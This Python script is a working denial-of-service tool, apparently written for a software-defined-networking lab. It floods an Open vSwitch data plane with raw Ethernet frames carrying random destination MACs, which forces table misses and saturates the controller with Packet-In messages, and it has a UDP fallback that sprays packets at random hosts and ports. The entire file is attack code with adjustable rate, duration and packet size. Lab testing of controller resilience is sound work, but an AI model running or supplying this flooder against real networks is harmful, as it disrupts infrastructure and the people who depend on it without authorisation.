#!/usr/bin/env python3
"""
Packet-In saturation generator.

Methods:
1. scapy: sends raw Ethernet frames with random destination MACs.
   Best for SDN Packet-In saturation because it bypasses ARP.

2. udp: fallback standard-library UDP sender.
   Not recommended for final testing because ARP can limit traffic.
"""

import argparse
import csv
import random
import socket
import time


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def run_scapy(args):
    try:
        from scapy.all import Ether, Raw, sendpfast, get_if_hwaddr
    except ImportError:
        raise SystemExit(
            "Scapy is not installed. Install with: sudo apt-get install python3-scapy"
        )

    src_mac = get_if_hwaddr(args.iface)
    payload = b"A" * max(1, args.size)

    delay = 0 if args.rate <= 0 else 1.0 / args.rate
    end_time = time.time() + args.duration

    sent = 0
    rows = []
    last_log = time.time()

    while time.time() < end_time:
        dst_mac = random_mac()

        # Random destination MAC means OVS will not have a learned flow for it.
        # This should hit the table-miss rule and trigger Packet-In.
        pkt = Ether(src=src_mac, dst=dst_mac, type=0x0800) / Raw(payload)

        sendpfast(pkt, iface=args.iface, verbose=False)
        sent += 1

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if delay > 0:
            time.sleep(delay)

    write_log(args.log, rows)
    print(f"packetin_attack method=scapy sent_packets={sent}", flush=True)


def run_udp(args):
    payload = b"A" * max(1, args.size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    delay = 0 if args.rate <= 0 else 1.0 / args.rate
    end_time = time.time() + args.duration

    sent = 0
    rows = []
    last_log = time.time()

    while time.time() < end_time:
        if args.target:
            dst = args.target
        else:
            dst = f"{args.target_prefix}{random.randint(args.start_host, args.end_host)}"

        port = random.randint(1024, 65535)

        try:
            sock.sendto(payload, (dst, port))
            sent += 1
        except OSError:
            pass

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if delay > 0:
            time.sleep(delay)

    sock.close()
    write_log(args.log, rows)
    print(f"packetin_attack method=udp sent_packets={sent}", flush=True)


def write_log(path, rows):
    if not path:
        return

    with open(path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "total_packets_sent"])
        writer.writerows(rows)


def parse_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("--method", choices=["scapy", "udp"], default="scapy")

    # Used by scapy mode.
    parser.add_argument("--iface", default="h2-eth0", help="Interface to send raw frames from")

    # Used by UDP mode.
    parser.add_argument("--target", default=None)
    parser.add_argument("--target-prefix", default="10.0.0.")
    parser.add_argument("--start-host", type=int, default=50)
    parser.add_argument("--end-host", type=int, default=250)

    # Shared.
    parser.add_argument("--rate", type=float, default=1200)
    parser.add_argument("--size", type=int, default=64)
    parser.add_argument("--duration", type=float, default=60)
    parser.add_argument("--log", default="attack_sent.csv")

    return parser.parse_args()


def main():
    args = parse_args()

    if args.method == "scapy":
        run_scapy(args)
    else:
        run_udp(args)


if __name__ == "__main__":
    main()